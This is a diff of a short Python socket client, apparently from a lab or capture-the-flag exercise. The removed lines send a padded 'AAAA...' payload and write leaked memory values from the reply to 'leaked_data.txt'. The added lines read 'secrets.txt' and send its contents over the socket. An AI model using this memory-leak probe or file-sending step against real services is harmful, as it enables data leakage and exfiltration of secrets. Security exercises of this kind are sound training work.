@@ -17,21 +17,12 @@ except socket.error as msg:
 
 try:
 
-    fo = open("leaked_data.txt", "a")
+    fo = open("secrets.txt", "r")
 
     # Send data
-    message = b'AAAAAAAAAAAAAAAAAAAAAAAA\n32\n'
-    print('sending {!r}'.format(message))
+    message = bytes(fo.read(), 'ascii')
+    #print('sending' + message)
     sock.sendall(message)
-
-    amount_received = 0
-    amount_expected = len(message)
-
-    while amount_received < amount_expected:
-        data = sock.recv(32)
-        amount_received += len(data)
-        print(zerochecker(hex(int.from_bytes(data[24:],"little")),18))
-        fo.write(zerochecker(hex(int.from_bytes(data[24:],"little")),18))
 
 finally:
     print('closing socket')
